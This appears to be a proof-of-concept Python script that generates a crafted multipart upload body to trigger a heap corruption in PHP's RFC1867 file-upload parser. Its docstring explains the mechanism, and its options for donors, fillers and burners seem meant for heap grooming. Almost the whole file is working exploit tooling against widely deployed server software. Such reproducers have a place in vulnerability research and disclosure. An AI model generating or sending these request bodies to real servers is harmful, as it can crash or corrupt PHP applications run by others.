#!/usr/bin/env python3
"""Path 1 reproducer: nested empty-upload records, no session fields.

The RFC1867 parser registers six $_FILES entries for every file part. With a
deeply nested field name and filename="", hundreds of small parts expand into
many HashTables, buckets and key strings, filling the Zend heap while the body
stays small. The final key allocation in _zend_hash_str_add_or_update_i() can
then fatal after nNumUsed was incremented, leaving a partial bucket that the
mod_php request cleanup later consumes.

usage: python3 path1_nested.py --out /tmp/p1.bin [--parts 860] [--depth 64]
"""
from __future__ import annotations

import argparse


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True)
    ap.add_argument("--parts", type=int, default=860)
    ap.add_argument("--depth", type=int, default=64)
    ap.add_argument("--key-pad", type=int, default=90)
    ap.add_argument("--fillers", type=int, default=0)
    ap.add_argument("--big", type=int, default=0)
    ap.add_argument("--big-len", type=int, default=8000)
    ap.add_argument("--burners", type=int, default=0)
    ap.add_argument("--burner-len", type=int, default=4000)
    ap.add_argument("--donors256", type=int, default=0)
    ap.add_argument("--donor-len", type=int, default=231)
    ap.add_argument("--longseg", type=int, default=0)
    ap.add_argument("--longval", type=int, default=8000)
    ap.add_argument("--pre", type=int, default=0)
    ap.add_argument("--pre-len", type=int, default=1000)
    ap.add_argument("--boundary", default="C" * 10)
    args = ap.parse_args()

    def part(name: bytes, value: bytes = b"") -> None:
        out.extend(b"--" + b + b'\r\nContent-Disposition: form-data; name="' + name + b'"\r\n\r\n' + value + b"\r\n")

    b = args.boundary.encode()
    out = bytearray()
    for i in range(args.parts):
        name = ("files[R%05d%s]" % (i, "K" * args.key_pad)).encode() + b"[a]" * (args.depth - 2)
        out += b"--" + b
        out += b'\r\nContent-Disposition: form-data; name="' + name + b'"; filename=""'
        out += b"\r\nContent-Type: application/octet-stream\r\n\r\n"
    for i in range(args.donors256):
        part(("d%04d" % i).encode(), b"V" * args.donor_len)
    for i in range(args.fillers):
        part(("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
    for i in range(args.big):
        part(("b%04d" % i).encode(), b"B" * args.big_len)
    for i in range(args.burners):
        part(("u%02d" % i).encode(), b"U" * args.burner_len)
    for i in range(args.pre):
        part(("p%02d" % i).encode(), b"P" * args.pre_len)
    if args.longseg:
        name = b"files[" + b"L" * args.longseg + b"][a]"
        part(name, b"V" * args.longval)
    out += b"--" + b + b"--\r\n"
    with open(args.out, "wb") as fh:
        fh.write(out)
    print("body=%d parts=%d depth=%d" % (len(out), args.parts, args.depth))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
